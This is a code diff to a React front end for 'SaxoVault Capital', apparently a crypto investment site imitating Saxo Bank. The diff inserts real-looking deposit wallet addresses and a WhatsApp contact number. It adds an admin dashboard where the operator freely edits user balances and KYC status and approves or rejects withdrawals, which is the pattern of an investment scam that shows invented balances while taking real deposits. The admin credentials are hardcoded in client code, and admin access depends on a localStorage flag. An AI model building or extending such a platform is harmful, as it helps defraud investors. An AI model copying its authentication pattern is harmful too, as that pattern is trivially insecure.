@@ -745,7 +745,7 @@ function FloatingContact() {
               {activeTab === 'options' && (
                 <div className="p-5 lg:p-6 space-y-3">
                   {/* WhatsApp */}
-                  <motion.a href="https://wa.me/1234567890" target="_blank" rel="noopener noreferrer"
+                  <motion.a href="https://wa.me/14642395280" target="_blank" rel="noopener noreferrer"
                     whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}
                     className="flex items-center gap-4 p-4 bg-gradient-to-r from-green-50 to-green-100 rounded-xl hover:shadow-md transition-all border border-green-200">
                     <div className="w-12 h-12 rounded-xl flex items-center justify-center bg-green-500 shadow-lg">
@@ -1633,12 +1633,12 @@ function DepositModal({ onClose }) {
   const [copied, setCopied] = useState(false);
 
   const cryptoOptions = [
-    { id: 'btc', name: 'Bitcoin', symbol: 'BTC', icon: '₿', color: '#f7931a', address: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', network: 'Bitcoin Network' },
-    { id: 'eth', name: 'Ethereum', symbol: 'ETH', icon: 'Ξ', color: '#627eea', address: '0x742d35Cc6634C0532925a3b844Bc9e7595f2bD73', network: 'ERC-20' },
-    { id: 'usdt', name: 'Tether', symbol: 'USDT', icon: '₮', color: '#26a17b', address: 'TN3W4H6rK2ce4vX9YnFQHwKENnHjoxb3m9', network: 'TRC-20' },
-    { id: 'usdc', name: 'USD Coin', symbol: 'USDC', icon: '$', color: '#2775ca', address: '0x742d35Cc6634C0532925a3b844Bc9e7595f2bD73', network: 'ERC-20' },
-    { id: 'bnb', name: 'BNB', symbol: 'BNB', icon: 'B', color: '#f3ba2f', address: 'bnb1grpf0955h0ykzq3ar5nmum7y6gdfl6lxfn46h2', network: 'BEP-20' },
-    { id: 'ltc', name: 'Litecoin', symbol: 'LTC', icon: 'Ł', color: '#bfbbbb', address: 'ltc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', network: 'Litecoin Network' }
+    { id: 'btc', name: 'Bitcoin', symbol: 'BTC', icon: '₿', color: '#f7931a', address: 'bc1qzmgg6hw0fttfpczh2whp8f44k497d6pucghk58', network: 'Bitcoin Network' },
+    { id: 'eth', name: 'Ethereum', symbol: 'ETH', icon: 'Ξ', color: '#627eea', address: '0x83057882eC7B7EE0cBe63C2fE2b8957e7ab69655', network: 'ERC-20' },
+    { id: 'usdt', name: 'Tether', symbol: 'USDT', icon: '₮', color: '#26a17b', address: 'TLGH9FucAuPNUoQw2XUFEDtCg4FFdJ2jKG', network: 'TRC-20' },
+    { id: 'usdc', name: 'USD Coin', symbol: 'USDC', icon: '$', color: '#2775ca', address: '0x83057882eC7B7EE0cBe63C2fE2b8957e7ab69655', network: 'ERC-20' },
+    { id: 'bnb', name: 'BNB', symbol: 'BNB', icon: 'B', color: '#f3ba2f', address: '0x83057882eC7B7EE0cBe63C2fE2b8957e7ab69655', network: 'BEP-20' },
+    { id: 'ltc', name: 'Litecoin', symbol: 'LTC', icon: 'Ł', color: '#bfbbbb', address: 'bc1qzmgg6hw0fttfpczh2whp8f44k497d6pucghk58', network: 'Litecoin Network' }
   ];
 
   const handleCopy = (text) => {
@@ -2864,24 +2864,633 @@ function ProfilePage({ user, setUser, onLogout }) {
   );
 }
 
+// ============ ADMIN CREDENTIALS ============
+const ADMIN_CREDENTIALS = {
+  email: 'saxovaultadmin@saxovault.com',
+  password: 'SaxoAdmin2024!'
+};
+
+// ============ LOCAL STORAGE HELPERS ============
+const Storage = {
+  getUsers: () => JSON.parse(localStorage.getItem('saxovault_users') || '[]'),
+  setUsers: (users) => localStorage.setItem('saxovault_users', JSON.stringify(users)),
+  
+  getTransactions: () => JSON.parse(localStorage.getItem('saxovault_transactions') || '[]'),
+  setTransactions: (txs) => localStorage.setItem('saxovault_transactions', JSON.stringify(txs)),
+  addTransaction: (tx) => {
+    const txs = Storage.getTransactions();
+    txs.unshift({ ...tx, id: Date.now(), createdAt: new Date().toISOString(), status: 'pending' });
+    Storage.setTransactions(txs);
+    return txs[0];
+  },
+  
+  getSettings: () => JSON.parse(localStorage.getItem('saxovault_settings') || JSON.stringify({
+    wallets: {
+      btc: 'bc1qzmgg6hw0fttfpczh2whp8f44k497d6pucghk58',
+      eth: '0x83057882eC7B7EE0cBe63C2fE2b8957e7ab69655',
+      usdt: 'TLGH9FucAuPNUoQw2XUFEDtCg4FFdJ2jKG'
+    },
+    whatsapp: '+14642395280',
+    email: 'support@saxovault.com',
+    siteName: 'SaxoVault Capital'
+  })),
+  setSettings: (settings) => localStorage.setItem('saxovault_settings', JSON.stringify(settings)),
+  
+  getNotifications: () => JSON.parse(localStorage.getItem('saxovault_notifications') || '[]'),
+  addNotification: (notif) => {
+    const notifs = Storage.getNotifications();
+    notifs.unshift({ ...notif, id: Date.now(), read: false, createdAt: new Date().toISOString() });
+    localStorage.setItem('saxovault_notifications', JSON.stringify(notifs.slice(0, 100)));
+  }
+};
+
+// ============ ADMIN LOGIN PAGE ============
+function AdminLoginPage({ onLogin }) {
+  const [email, setEmail] = useState('');
+  const [password, setPassword] = useState('');
+  const [error, setError] = useState('');
+  const [loading, setLoading] = useState(false);
+
+  const handleLogin = (e) => {
+    e.preventDefault();
+    setLoading(true);
+    setError('');
+    
+    setTimeout(() => {
+      if (email === ADMIN_CREDENTIALS.email && password === ADMIN_CREDENTIALS.password) {
+        localStorage.setItem('saxovault_admin', 'true');
+        onLogin();
+      } else {
+        setError('Invalid admin credentials');
+      }
+      setLoading(false);
+    }, 1000);
+  };
+
+  return (
+    <div className="min-h-screen flex items-center justify-center p-6" style={{ background: `linear-gradient(135deg, ${theme.navy} 0%, ${theme.navyLight} 100%)` }}>
+      <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}
+        className="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-md">
+        <div className="text-center mb-8">
+          <div className="w-16 h-16 mx-auto rounded-2xl flex items-center justify-center mb-4"
+            style={{ background: `linear-gradient(135deg, ${theme.gold} 0%, ${theme.goldDark} 100%)` }}>
+            <ShieldCheck className="w-8 h-8 text-white" />
+          </div>
+          <h1 className="font-serif text-2xl" style={{ color: theme.navy }}>Admin Portal</h1>
+          <p className="text-gray-500 text-sm mt-1">SaxoVault Capital Management</p>
+        </div>
+
+        {error && (
+          <div className="mb-4 p-3 rounded-xl bg-red-50 text-red-600 text-sm flex items-center gap-2">
+            <AlertCircle className="w-4 h-4" /> {error}
+          </div>
+        )}
+
+        <form onSubmit={handleLogin} className="space-y-4">
+          <div>
+            <label className="block text-sm font-medium text-gray-700 mb-1.5">Admin Email</label>
+            <div className="relative">
+              <Mail className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
+              <input type="email" value={email} onChange={(e) => setEmail(e.target.value)}
+                className="w-full pl-12 pr-4 py-3 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500"
+                placeholder="admin@saxovault.com" required />
+            </div>
+          </div>
+
+          <div>
+            <label className="block text-sm font-medium text-gray-700 mb-1.5">Password</label>
+            <div className="relative">
+              <Lock className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
+              <input type="password" value={password} onChange={(e) => setPassword(e.target.value)}
+                className="w-full pl-12 pr-4 py-3 border border-gray-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-500"
+                placeholder="••••••••" required />
+            </div>
+          </div>
+
+          <motion.button type="submit" disabled={loading} whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}
+            className="w-full py-3.5 rounded-xl text-white font-semibold flex items-center justify-center gap-3"
+            style={{ background: `linear-gradient(135deg, ${theme.navy} 0%, ${theme.navyLight} 100%)` }}>
+            {loading ? <RefreshCw className="w-5 h-5 animate-spin" /> : <><ShieldCheck className="w-5 h-5" /> Access Admin Panel</>}
+          </motion.button>
+        </form>
+        
+        <div className="mt-6 text-center">
+          <a href="/" className="text-sm text-gray-500 hover:underline">← Back to Website</a>
+        </div>
+      </motion.div>
+    </div>
+  );
+}
+
+// ============ ADMIN DASHBOARD ============
+function AdminDashboard({ onLogout }) {
+  const [activeTab, setActiveTab] = useState('overview');
+  const [users, setUsers] = useState(Storage.getUsers());
+  const [transactions, setTransactions] = useState(Storage.getTransactions());
+  const [settings, setSettings] = useState(Storage.getSettings());
+  const [notifications, setNotifications] = useState(Storage.getNotifications());
+  const [editingUser, setEditingUser] = useState(null);
+
+  // Refresh data periodically
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setUsers(Storage.getUsers());
+      setTransactions(Storage.getTransactions());
+      setNotifications(Storage.getNotifications());
+    }, 5000);
+    return () => clearInterval(interval);
+  }, []);
+
+  // Stats
+  const totalUsers = users.length;
+  const totalDeposits = transactions.filter(t => t.type === 'deposit' && t.status === 'completed').reduce((sum, t) => sum + t.amount, 0);
+  const pendingDeposits = transactions.filter(t => t.type === 'deposit' && t.status === 'pending').length;
+  const pendingWithdrawals = transactions.filter(t => t.type === 'withdrawal' && t.status === 'pending').length;
+
+  const handleUpdateUser = (userId, updates) => {
+    const updatedUsers = users.map(u => u.uid === userId ? { ...u, ...updates } : u);
+    setUsers(updatedUsers);
+    Storage.setUsers(updatedUsers);
+    Storage.addNotification({ type: 'user_update', message: `User updated successfully` });
+    setEditingUser(null);
+  };
+
+  const handleUpdateTransaction = (txId, status) => {
+    const updatedTxs = transactions.map(t => t.id === txId ? { ...t, status, updatedAt: new Date().toISOString() } : t);
+    setTransactions(updatedTxs);
+    Storage.setTransactions(updatedTxs);
+    Storage.addNotification({ type: 'tx_update', message: `Transaction ${status}` });
+  };
+
+  const handleUpdateSettings = (newSettings) => {
+    setSettings(newSettings);
+    Storage.setSettings(newSettings);
+    Storage.addNotification({ type: 'settings_update', message: 'Settings updated successfully' });
+    alert('Settings saved successfully!');
+  };
+
+  const tabs = [
+    { id: 'overview', name: 'Overview', icon: PieChart },
+    { id: 'users', name: 'Users', icon: Users },
+    { id: 'transactions', name: 'Transactions', icon: CreditCard },
+    { id: 'notifications', name: 'Activity Log', icon: Bell },
+    { id: 'settings', name: 'Settings', icon: Settings }
+  ];
+
+  return (
+    <div className="min-h-screen" style={{ background: theme.cream }}>
+      {/* Admin Header */}
+      <div className="bg-white shadow-md px-4 lg:px-6 py-4 flex items-center justify-between">
+        <div className="flex items-center gap-3">
+          <div className="w-10 h-10 rounded-xl flex items-center justify-center" style={{ background: `linear-gradient(135deg, ${theme.gold} 0%, ${theme.goldDark} 100%)` }}>
+            <Crown className="w-5 h-5 text-white" />
+          </div>
+          <div>
+            <h1 className="font-serif text-lg lg:text-xl" style={{ color: theme.navy }}>Admin Dashboard</h1>
+            <p className="text-gray-500 text-xs">SaxoVault Capital</p>
+          </div>
+        </div>
+        <motion.button onClick={onLogout} whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}
+          className="flex items-center gap-2 px-3 lg:px-4 py-2 rounded-xl bg-red-50 text-red-600 hover:bg-red-100 text-sm">
+          <LogOut className="w-4 h-4" /> <span className="hidden sm:inline">Logout</span>
+        </motion.button>
+      </div>
+
+      <div className="flex flex-col lg:flex-row">
+        {/* Sidebar - Mobile: horizontal scroll, Desktop: vertical */}
+        <div className="lg:w-64 bg-white shadow-lg lg:min-h-screen">
+          <div className="flex lg:flex-col overflow-x-auto lg:overflow-x-visible p-2 lg:p-4 gap-2">
+            {tabs.map((tab) => (
+              <motion.button key={tab.id} onClick={() => setActiveTab(tab.id)}
+                whileTap={{ scale: 0.98 }}
+                className={`flex items-center gap-2 lg:gap-3 px-3 lg:px-4 py-2 lg:py-3 rounded-xl whitespace-nowrap transition-all ${activeTab === tab.id ? 'shadow-md' : 'hover:bg-gray-50'}`}
+                style={activeTab === tab.id ? { background: `${theme.navy}10`, color: theme.navy } : { color: '#6b7280' }}>
+                <tab.icon className="w-4 h-4 lg:w-5 lg:h-5" />
+                <span className="font-medium text-sm">{tab.name}</span>
+                {tab.id === 'transactions' && (pendingDeposits + pendingWithdrawals) > 0 && (
+                  <span className="ml-auto px-2 py-0.5 rounded-full text-xs bg-red-500 text-white">
+                    {pendingDeposits + pendingWithdrawals}
+                  </span>
+                )}
+              </motion.button>
+            ))}
+          </div>
+        </div>
+
+        {/* Main Content */}
+        <div className="flex-1 p-4 lg:p-6">
+          {/* Overview Tab */}
+          {activeTab === 'overview' && (
+            <div>
+              <h2 className="font-serif text-xl lg:text-2xl mb-6" style={{ color: theme.navy }}>Dashboard Overview</h2>
+              
+              <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 lg:gap-6 mb-8">
+                {[
+                  { label: 'Total Users', value: totalUsers, icon: Users, color: theme.navy },
+                  { label: 'Total Deposits', value: `$${totalDeposits.toLocaleString()}`, icon: Download, color: theme.green },
+                  { label: 'Pending Deposits', value: pendingDeposits, icon: Clock, color: theme.gold },
+                  { label: 'Pending Withdrawals', value: pendingWithdrawals, icon: Upload, color: '#ef4444' }
+                ].map((stat, i) => (
+                  <motion.div key={i} initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: i * 0.1 }}
+                    className="bg-white rounded-xl lg:rounded-2xl p-4 lg:p-6 shadow-lg">
+                    <div className="w-10 h-10 lg:w-12 lg:h-12 rounded-xl flex items-center justify-center mb-3" style={{ background: `${stat.color}15` }}>
+                      <stat.icon className="w-5 h-5 lg:w-6 lg:h-6" style={{ color: stat.color }} />
+                    </div>
+                    <p className="text-gray-500 text-xs lg:text-sm">{stat.label}</p>
+                    <p className="text-xl lg:text-2xl font-bold" style={{ color: stat.color }}>{stat.value}</p>
+                  </motion.div>
+                ))}
+              </div>
+
+              {/* Recent Activity */}
+              <div className="bg-white rounded-xl lg:rounded-2xl shadow-lg p-4 lg:p-6">
+                <h3 className="font-serif text-lg mb-4" style={{ color: theme.navy }}>Recent Transactions</h3>
+                <div className="space-y-3">
+                  {transactions.slice(0, 5).map((tx, i) => (
+                    <div key={i} className="flex items-center justify-between p-3 lg:p-4 rounded-xl bg-gray-50">
+                      <div className="flex items-center gap-3">
+                        <div className={`w-8 h-8 lg:w-10 lg:h-10 rounded-full flex items-center justify-center ${tx.type === 'deposit' ? 'bg-green-100' : 'bg-orange-100'}`}>
+                          {tx.type === 'deposit' ? <Download className="w-4 h-4 lg:w-5 lg:h-5 text-green-600" /> : <Upload className="w-4 h-4 lg:w-5 lg:h-5 text-orange-600" />}
+                        </div>
+                        <div>
+                          <p className="font-medium text-sm" style={{ color: theme.navy }}>{tx.type === 'deposit' ? 'Deposit' : 'Withdrawal'}</p>
+                          <p className="text-xs text-gray-500">{tx.userEmail}</p>
+                        </div>
+                      </div>
+                      <div className="text-right">
+                        <p className="font-bold text-sm lg:text-base">${tx.amount?.toLocaleString()}</p>
+                        <span className={`text-xs px-2 py-0.5 rounded-full ${
+                          tx.status === 'completed' ? 'bg-green-100 text-green-700' :
+                          tx.status === 'pending' ? 'bg-yellow-100 text-yellow-700' :
+                          'bg-red-100 text-red-700'
+                        }`}>{tx.status}</span>
+                      </div>
+                    </div>
+                  ))}
+                  {transactions.length === 0 && (
+                    <p className="text-center text-gray-500 py-8">No transactions yet</p>
+                  )}
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Users Tab */}
+          {activeTab === 'users' && (
+            <div>
+              <h2 className="font-serif text-xl lg:text-2xl mb-6" style={{ color: theme.navy }}>User Management</h2>
+              
+              <div className="bg-white rounded-xl lg:rounded-2xl shadow-lg overflow-hidden">
+                <div className="p-4 border-b border-gray-100">
+                  <p className="text-gray-500 text-sm">{users.length} registered users</p>
+                </div>
+                <div className="divide-y divide-gray-100">
+                  {users.map((user, i) => (
+                    <div key={i} className="p-4 hover:bg-gray-50 transition-colors">
+                      <div className="flex items-center justify-between">
+                        <div className="flex items-center gap-3">
+                          <div className="w-10 h-10 lg:w-12 lg:h-12 rounded-full flex items-center justify-center text-white font-bold text-sm"
+                            style={{ background: `linear-gradient(135deg, ${theme.navy} 0%, ${theme.navyLight} 100%)` }}>
+                            {user.name?.charAt(0) || user.email?.charAt(0) || 'U'}
+                          </div>
+                          <div>
+                            <p className="font-medium text-sm" style={{ color: theme.navy }}>{user.name || 'No Name'}</p>
+                            <p className="text-xs text-gray-500">{user.email}</p>
+                          </div>
+                        </div>
+                        <div className="flex items-center gap-2 lg:gap-4">
+                          <div className="text-right hidden sm:block">
+                            <p className="font-bold text-sm" style={{ color: theme.green }}>${(user.balance || 0).toLocaleString()}</p>
+                            <span className={`text-xs px-2 py-0.5 rounded-full ${user.kycStatus === 'verified' ? 'bg-green-100 text-green-700' : 'bg-yellow-100 text-yellow-700'}`}>
+                              {user.kycStatus || 'pending'}
+                            </span>
+                          </div>
+                          <motion.button onClick={() => setEditingUser(user)} whileHover={{ scale: 1.1 }} whileTap={{ scale: 0.9 }}
+                            className="p-2 rounded-lg hover:bg-gray-100">
+                            <Settings className="w-5 h-5 text-gray-500" />
+                          </motion.button>
+                        </div>
+                      </div>
+                    </div>
+                  ))}
+                  {users.length === 0 && (
+                    <p className="text-center text-gray-500 py-12">No users registered yet</p>
+                  )}
+                </div>
+              </div>
+
+              {/* Edit User Modal */}
+              <AnimatePresence>
+                {editingUser && (
+                  <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
+                    className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4"
+                    onClick={() => setEditingUser(null)}>
+                    <motion.div initial={{ scale: 0.9 }} animate={{ scale: 1 }} exit={{ scale: 0.9 }}
+                      className="bg-white rounded-2xl p-6 w-full max-w-md shadow-2xl" onClick={(e) => e.stopPropagation()}>
+                      <h3 className="font-serif text-xl mb-4" style={{ color: theme.navy }}>Edit User: {editingUser.name || editingUser.email}</h3>
+                      
+                      <div className="space-y-4">
+                        <div>
+                          <label className="block text-sm font-medium text-gray-700 mb-1">Balance ($)</label>
+                          <input type="number" value={editingUser.balance || 0}
+                            onChange={(e) => setEditingUser({...editingUser, balance: parseFloat(e.target.value) || 0})}
+                            className="w-full px-4 py-2 border border-gray-200 rounded-xl" />
+                        </div>
+                        <div>
+                          <label className="block text-sm font-medium text-gray-700 mb-1">KYC Status</label>
+                          <select value={editingUser.kycStatus || 'pending'}
+                            onChange={(e) => setEditingUser({...editingUser, kycStatus: e.target.value})}
+                            className="w-full px-4 py-2 border border-gray-200 rounded-xl">
+                            <option value="pending">Pending</option>
+                            <option value="verified">Verified</option>
+                            <option value="rejected">Rejected</option>
+                          </select>
+                        </div>
+                        <div>
+                          <label className="block text-sm font-medium text-gray-700 mb-1">Account Status</label>
+                          <select value={editingUser.status || 'active'}
+                            onChange={(e) => setEditingUser({...editingUser, status: e.target.value})}
+                            className="w-full px-4 py-2 border border-gray-200 rounded-xl">
+                            <option value="active">Active</option>
+                            <option value="suspended">Suspended</option>
+                            <option value="banned">Banned</option>
+                          </select>
+                        </div>
+                      </div>
+
+                      <div className="flex gap-3 mt-6">
+                        <motion.button onClick={() => setEditingUser(null)} whileHover={{ scale: 1.02 }}
+                          className="flex-1 py-2.5 rounded-xl border border-gray-200">Cancel</motion.button>
+                        <motion.button onClick={() => handleUpdateUser(editingUser.uid, editingUser)} whileHover={{ scale: 1.02 }}
+                          className="flex-1 py-2.5 rounded-xl text-white"
+                          style={{ background: theme.navy }}>Save Changes</motion.button>
+                      </div>
+                    </motion.div>
+                  </motion.div>
+                )}
+              </AnimatePresence>
+            </div>
+          )}
+
+          {/* Transactions Tab */}
+          {activeTab === 'transactions' && (
+            <div>
+              <h2 className="font-serif text-xl lg:text-2xl mb-6" style={{ color: theme.navy }}>Transaction Management</h2>
+              
+              <div className="bg-white rounded-xl lg:rounded-2xl shadow-lg overflow-hidden">
+                <div className="p-4 border-b border-gray-100">
+                  <div className="flex flex-wrap gap-2">
+                    <span className="px-3 py-1 rounded-full text-xs bg-yellow-100 text-yellow-700">
+                      {pendingDeposits} pending deposits
+                    </span>
+                    <span className="px-3 py-1 rounded-full text-xs bg-orange-100 text-orange-700">
+                      {pendingWithdrawals} pending withdrawals
+                    </span>
+                  </div>
+                </div>
+                <div className="divide-y divide-gray-100">
+                  {transactions.map((tx, i) => (
+                    <div key={i} className="p-4 hover:bg-gray-50 transition-colors">
+                      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
+                        <div className="flex items-center gap-3">
+                          <div className={`w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0 ${tx.type === 'deposit' ? 'bg-green-100' : 'bg-orange-100'}`}>
+                            {tx.type === 'deposit' ? <Download className="w-5 h-5 text-green-600" /> : <Upload className="w-5 h-5 text-orange-600" />}
+                          </div>
+                          <div>
+                            <p className="font-medium text-sm" style={{ color: theme.navy }}>
+                              {tx.type === 'deposit' ? 'Deposit' : 'Withdrawal'} - {tx.crypto}
+                            </p>
+                            <p className="text-xs text-gray-500">{tx.userEmail}</p>
+                            <p className="text-xs text-gray-400">{new Date(tx.createdAt).toLocaleString()}</p>
+                          </div>
+                        </div>
+                        <div className="flex items-center justify-between sm:justify-end gap-3">
+                          <div className="text-right">
+                            <p className="font-bold">${tx.amount?.toLocaleString()}</p>
+                            <span className={`text-xs px-2 py-0.5 rounded-full ${
+                              tx.status === 'completed' ? 'bg-green-100 text-green-700' :
+                              tx.status === 'pending' ? 'bg-yellow-100 text-yellow-700' :
+                              'bg-red-100 text-red-700'
+                            }`}>{tx.status}</span>
+                          </div>
+                          {tx.status === 'pending' && (
+                            <div className="flex gap-2">
+                              <motion.button onClick={() => handleUpdateTransaction(tx.id, 'completed')}
+                                whileHover={{ scale: 1.1 }} whileTap={{ scale: 0.9 }}
+                                className="p-2 rounded-lg bg-green-100 text-green-600 hover:bg-green-200">
+                                <Check className="w-4 h-4" />
+                              </motion.button>
+                              <motion.button onClick={() => handleUpdateTransaction(tx.id, 'rejected')}
+                                whileHover={{ scale: 1.1 }} whileTap={{ scale: 0.9 }}
+                                className="p-2 rounded-lg bg-red-100 text-red-600 hover:bg-red-200">
+                                <X className="w-4 h-4" />
+                              </motion.button>
+                            </div>
+                          )}
+                        </div>
+                      </div>
+                    </div>
+                  ))}
+                  {transactions.length === 0 && (
+                    <p className="text-center text-gray-500 py-12">No transactions yet</p>
+                  )}
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Notifications Tab */}
+          {activeTab === 'notifications' && (
+            <div>
+              <h2 className="font-serif text-xl lg:text-2xl mb-6" style={{ color: theme.navy }}>Activity Log</h2>
+              
+              <div className="bg-white rounded-xl lg:rounded-2xl shadow-lg overflow-hidden">
+                <div className="divide-y divide-gray-100">
+                  {notifications.map((notif, i) => (
+                    <div key={i} className={`p-4 ${notif.read ? '' : 'bg-blue-50'}`}>
+                      <div className="flex items-center gap-3">
+                        <div className="w-10 h-10 rounded-full bg-gray-100 flex items-center justify-center flex-shrink-0">
+                          <Bell className="w-5 h-5 text-gray-500" />
+                        </div>
+                        <div className="flex-1">
+                          <p className="font-medium text-sm" style={{ color: theme.navy }}>{notif.message}</p>
+                          <p className="text-xs text-gray-500">{new Date(notif.createdAt).toLocaleString()}</p>
+                        </div>
+                      </div>
+                    </div>
+                  ))}
+                  {notifications.length === 0 && (
+                    <p className="text-center text-gray-500 py-12">No activity yet</p>
+                  )}
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Settings Tab */}
+          {activeTab === 'settings' && (
+            <div>
+              <h2 className="font-serif text-xl lg:text-2xl mb-6" style={{ color: theme.navy }}>Platform Settings</h2>
+              
+              <div className="space-y-6">
+                {/* Wallet Addresses */}
+                <div className="bg-white rounded-xl lg:rounded-2xl shadow-lg p-4 lg:p-6">
+                  <h3 className="font-serif text-lg mb-4 flex items-center gap-2" style={{ color: theme.navy }}>
+                    <Wallet className="w-5 h-5" /> Deposit Wallet Addresses
+                  </h3>
+                  <div className="space-y-4">
+                    <div>
+                      <label className="block text-sm font-medium text-gray-700 mb-1">Bitcoin (BTC)</label>
+                      <input type="text" value={settings.wallets?.btc || ''}
+                        onChange={(e) => setSettings({...settings, wallets: {...settings.wallets, btc: e.target.value}})}
+                        className="w-full px-4 py-2 border border-gray-200 rounded-xl font-mono text-sm" />
+                    </div>
+                    <div>
+                      <label className="block text-sm font-medium text-gray-700 mb-1">Ethereum (ETH)</label>
+                      <input type="text" value={settings.wallets?.eth || ''}
+                        onChange={(e) => setSettings({...settings, wallets: {...settings.wallets, eth: e.target.value}})}
+                        className="w-full px-4 py-2 border border-gray-200 rounded-xl font-mono text-sm" />
+                    </div>
+                    <div>
+                      <label className="block text-sm font-medium text-gray-700 mb-1">USDT (TRC-20)</label>
+                      <input type="text" value={settings.wallets?.usdt || ''}
+                        onChange={(e) => setSettings({...settings, wallets: {...settings.wallets, usdt: e.target.value}})}
+                        className="w-full px-4 py-2 border border-gray-200 rounded-xl font-mono text-sm" />
+                    </div>
+                  </div>
+                </div>
+
+                {/* Contact Settings */}
+                <div className="bg-white rounded-xl lg:rounded-2xl shadow-lg p-4 lg:p-6">
+                  <h3 className="font-serif text-lg mb-4 flex items-center gap-2" style={{ color: theme.navy }}>
+                    <Phone className="w-5 h-5" /> Contact Settings
+                  </h3>
+                  <div className="space-y-4">
+                    <div>
+                      <label className="block text-sm font-medium text-gray-700 mb-1">WhatsApp Number</label>
+                      <input type="text" value={settings.whatsapp || ''}
+                        onChange={(e) => setSettings({...settings, whatsapp: e.target.value})}
+                        className="w-full px-4 py-2 border border-gray-200 rounded-xl"
+                        placeholder="+1234567890" />
+                    </div>
+                    <div>
+                      <label className="block text-sm font-medium text-gray-700 mb-1">Support Email</label>
+                      <input type="email" value={settings.email || ''}
+                        onChange={(e) => setSettings({...settings, email: e.target.value})}
+                        className="w-full px-4 py-2 border border-gray-200 rounded-xl" />
+                    </div>
+                  </div>
+                </div>
+
+                {/* Site Settings */}
+                <div className="bg-white rounded-xl lg:rounded-2xl shadow-lg p-4 lg:p-6">
+                  <h3 className="font-serif text-lg mb-4 flex items-center gap-2" style={{ color: theme.navy }}>
+                    <Globe className="w-5 h-5" /> Site Settings
+                  </h3>
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 mb-1">Site Name</label>
+                    <input type="text" value={settings.siteName || ''}
+                      onChange={(e) => setSettings({...settings, siteName: e.target.value})}
+                      className="w-full px-4 py-2 border border-gray-200 rounded-xl" />
+                  </div>
+                </div>
+
+                <motion.button onClick={() => handleUpdateSettings(settings)} whileHover={{ scale: 1.02 }} whileTap={{ scale: 0.98 }}
+                  className="w-full py-3 rounded-xl text-white font-semibold"
+                  style={{ background: `linear-gradient(135deg, ${theme.green} 0%, ${theme.greenDark} 100%)` }}>
+                  Save All Settings
+                </motion.button>
+              </div>
+            </div>
+          )}
+        </div>
+      </div>
+    </div>
+  );
+}
+
 // ============ MAIN APP ============
 export default function App() {
-  const [auth, setAuth] = useState(false);
+  const [isAuth, setIsAuth] = useState(false);
+  const [isAdmin, setIsAdmin] = useState(false);
+  const [showAdminLogin, setShowAdminLogin] = useState(false);
   const [page, setPage] = useState('home');
   const [selected, setSelected] = useState(null);
   const [showInvest, setShowInvest] = useState(false);
   const [user, setUser] = useState({
-    name: 'James Anderson',
-    email: 'james@saxobank.com',
-    phone: '+1 (555) 123-4567',
-    address: '123 Investment Drive, New York, NY 10001',
-    balance: 250000,
+    name: '',
+    email: '',
+    phone: '',
+    address: '',
+    balance: 0,
     profileImage: null
   });
 
+  // Check for admin route
+  useEffect(() => {
+    if (window.location.pathname === '/admin' || window.location.hash === '#admin') {
+      setShowAdminLogin(true);
+    }
+    // Check if admin is already logged in
+    if (localStorage.getItem('saxovault_admin') === 'true') {
+      setIsAdmin(true);
+      setShowAdminLogin(true);
+    }
+  }, []);
+
+  const handleLogin = (userData) => {
+    if (userData) {
+      setUser({
+        name: userData.name || '',
+        email: userData.email || '',
+        phone: userData.phone || '',
+        country: userData.country || '',
+        balance: userData.balance || 0,
+        profileImage: userData.profileImage || null
+      });
+      // Save to localStorage for admin to see
+      const users = Storage.getUsers();
+      const existingUser = users.find(u => u.email === userData.email);
+      if (!existingUser) {
+        users.push({ ...userData, uid: userData.uid || Date.now().toString(), createdAt: new Date().toISOString() });
+        Storage.setUsers(users);
+      }
+    }
+    setIsAuth(true);
+  };
+
+  const handleLogout = async () => {
+    try {
+      await logoutUser();
+    } catch (e) {}
+    setIsAuth(false);
+    setUser({ name: '', email: '', phone: '', address: '', balance: 0, profileImage: null });
+  };
+
+  const handleAdminLogout = () => {
+    localStorage.removeItem('saxovault_admin');
+    setIsAdmin(false);
+    setShowAdminLogin(false);
+  };
+
+  // Admin Login Page
+  if (showAdminLogin && !isAdmin) {
+    return <AdminLoginPage onLogin={() => setIsAdmin(true)} />;
+  }
+
+  // Admin Dashboard
+  if (isAdmin) {
+    return <AdminDashboard onLogout={handleAdminLogout} />;
+  }
+
+  // User Auth Page
+  if (!isAuth) {
+    return <AuthPage onLogin={handleLogin} />;
+  }
+
   const handleSelectInvestment = (inv) => setSelected(inv);
 
-  if (!auth) return <AuthPage onLogin={() => setAuth(true)} />;
+  // Main app content continues below
 
   return (
     <div className="min-h-screen" style={{ background: theme.cream }}>
